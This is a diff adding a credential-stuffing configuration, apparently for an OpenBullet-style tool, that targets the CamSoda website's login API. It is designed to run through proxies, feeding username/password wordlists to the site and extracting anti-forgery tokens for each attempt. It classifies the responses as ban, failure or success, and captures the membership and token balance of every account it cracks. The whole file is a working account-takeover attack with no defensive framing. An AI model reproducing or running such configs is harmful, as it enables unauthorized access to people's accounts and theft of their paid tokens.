@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "CamSoda",
+  "SuggestedBots": 30,
+  "LastModified": "2018-06-15T00:28:31.3835099+02:00",
+  "AdditionalInfo": "Bans proxies very fast",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_MAIN_PAGE REQUEST GET "https://www.camsoda.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_XSRF PARSE "<COOKIES(www_cs_session)>" LR "" "" Recursive=FALSE -> VAR "XSRF" "" "" 
+#PARSE_CSRF PARSE "<SOURCE>" CSS "[name=_token]" "content" 0 -> VAR "CSRF" "" "" 
+#LOGIN REQUEST POST "https://www.camsoda.com/api/v1/auth/login" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"recaptchaResponse\":\"\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.camsoda.com/" 
+  HEADER "origin: https://www.camsoda.com" 
+  HEADER "X-XSRF-TOKEN: <XSRF>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "invalidCaptcha" 
+  KEYCHAIN Failure OR 
+    KEY "The username field is required" 
+    KEY "These credentials do not match our records" 
+  KEYCHAIN Success OR 
+    KEY "followed_email\":" 
+#CAP_MEMBERSHIP PARSE "<SOURCE>" JSON "membership" Recursive=FALSE -> CAP "Membership" "" "" 
+#CAP_TOKENS PARSE "<SOURCE>" JSON "tokens" Recursive=FALSE -> CAP "Tokens" "" "" 
